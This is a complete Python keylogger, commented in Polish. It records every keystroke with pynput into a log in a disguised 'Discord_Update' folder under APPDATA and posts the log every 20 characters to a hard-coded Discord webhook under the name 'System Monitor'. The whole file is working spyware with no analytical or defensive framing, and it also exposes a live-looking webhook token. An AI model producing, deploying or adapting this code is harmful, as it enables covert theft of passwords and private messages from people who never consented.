import os
import requests
from pynput import keyboard
from datetime import datetime

# Konfiguracja
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382693220693311558/IhsRMDGlX93UkzSDVZUX77twb11n_aD0oPhfzYBrLlM2z_V94WseBM-HV8OKT0e9fD3h"
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'Discord_Update', 'logs.txt')
SEND_THRESHOLD = 20  # Wysyłaj co 20 znaków

class DiscordLogger:
    def __init__(self):
        self.char_count = 0
        self.special_chars = {'Key.space': ' ', 'Key.enter': '\n', 'Key.backspace': '[BACKSPACE]', 
                             'Key.tab': '[TAB]', 'Key.esc': '[ESC]', 'Key.shift': '[SHIFT]'}
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    
    def format_key(self, key):
        # Zamiana klawiszy specjalnych na czytelne formy
        try:
            if hasattr(key, 'char'):
                return key.char
            return self.special_chars.get(str(key), f'[{str(key).replace("Key.", "")}]')
        except:
            return '[UNKNOWN]'

    def log_key(self, key):
        try:
            formatted_key = self.format_key(key)
            key_length = 1  # Każdy klawisz = 1 znak (nawet specjalne)
            
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(formatted_key)
            
            self.char_count += key_length
            
            if self.char_count >= SEND_THRESHOLD:
                self.send_logs()
                self.char_count = 0
                
        except Exception as e:
            print(f"Log error: {e}")

    def send_logs(self):
        try:
            if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
                return

            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                content = f.read()

            if content:
                # Wysyłka z lepszym formatowaniem
                payload = {
                    "content": f"**Keylog ({datetime.now().strftime('%H:%M:%S')}):**\n```\n{content[:2000]}\n```",
                    "username": "System Monitor"
                }
                
                response = requests.post(
                    DISCORD_WEBHOOK,
                    json=payload,
                    timeout=10
                )
                response.raise_for_status()
                
                # Czyść plik tylko po udanym wysłaniu
                with open(LOG_FILE, 'w', encoding='utf-8') as f:
                    f.truncate()

        except Exception as e:
            print(f"Send error: {e}")

# Uruchomienie
logger = DiscordLogger()

def on_press(key):
    logger.log_key(key)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()